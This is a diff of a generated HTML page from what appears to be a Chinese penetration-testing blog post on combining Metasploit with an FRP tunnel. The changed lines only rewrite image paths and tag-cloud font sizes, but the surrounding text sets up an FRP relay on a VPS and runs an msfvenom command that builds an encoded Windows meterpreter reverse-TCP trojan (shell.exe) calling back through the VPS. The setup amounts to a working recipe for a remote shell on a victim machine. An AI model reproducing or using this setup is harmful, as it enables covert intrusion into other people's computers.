@@ -223,17 +223,17 @@
 <p>完成配置，启动服务端</p>
 <p>前台启动： <code>./frps -c frps.ini</code></p>
 <p>后台启动： <code>nohup ./frps -c frps.ini &gt; log.txt &amp;</code></p>
-<p><img src="image-20210215131526289.png" alt="image-20210215131526289"></p>
+<p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215131526289.png" alt="image-20210215131526289"></p>
 <p>可登录图形化界面 ip:7500，记得防火墙开启这几个端口</p>
-<p><img src="image-20210215131747143.png" alt="image-20210215131747143"></p>
+<p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215131747143.png" alt="image-20210215131747143"></p>
 <h2 id="0x02-kali客户端的配置"><a class="markdownIt-Anchor" href="#0x02-kali客户端的配置">#</a> 0x02 kali 客户端的配置</h2>
 <p>下载 frp 解压至 kali，编辑 <code>frpc.ini</code>  文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 81.xx.xx.xx		#vps的ip</span><br><span class="line">server_port &#x3D; 6531			#连接frp的端口</span><br><span class="line">token &#x3D; spaceman			#连接frp的口令</span><br><span class="line">[msf]</span><br><span class="line">type &#x3D; tcp					#连接协议</span><br><span class="line">local_ip &#x3D; 127.0.0.1		#本地ip</span><br><span class="line">local_port &#x3D; 6759			#本地转发vps端口</span><br><span class="line">remote_port &#x3D; 6000			#访问端口，也是木马的端口</span><br></pre></td></tr></table></figure>
 <p>启动 frpc， <code>./frps -c frps.ini</code></p>
 <p>vps 连接成功</p>
-<p><img src="image-20210215132017441.png" alt="image-20210215132017441"></p>
+<p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215132017441.png" alt="image-20210215132017441"></p>
 <p>kali 连接成功</p>
-<p><img src="image-20210215132057909.png" alt="image-20210215132057909"></p>
+<p><img src="/2021/02/15/MSF-FRP%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%B8%97%E9%80%8F/image-20210215132057909.png" alt="image-20210215132057909"></p>
 <p>木马制作</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;vps LPORT&#x3D;6000 -e x86&#x2F;shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 15 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
 <p>msf 设置监听</p>
@@ -391,11 +391,11 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/CVE/" style="font-size: 14.574935173960956px;" class="tag-cloud-link">CVE</a>
+    <a href="/tags/CVE/" style="font-size: 15.091511434644273px;" class="tag-cloud-link">CVE</a>
     
-    <a href="/tags/MSF/" style="font-size: 9.1783825282754px;" class="tag-cloud-link">MSF</a>
+    <a href="/tags/MSF/" style="font-size: 13.137414925580057px;" class="tag-cloud-link">MSF</a>
     
-    <a href="/tags/getshell/" style="font-size: 10.89213751716526px;" class="tag-cloud-link">getshell</a>
+    <a href="/tags/getshell/" style="font-size: 16.417583398131583px;" class="tag-cloud-link">getshell</a>
     
 </div>
                 
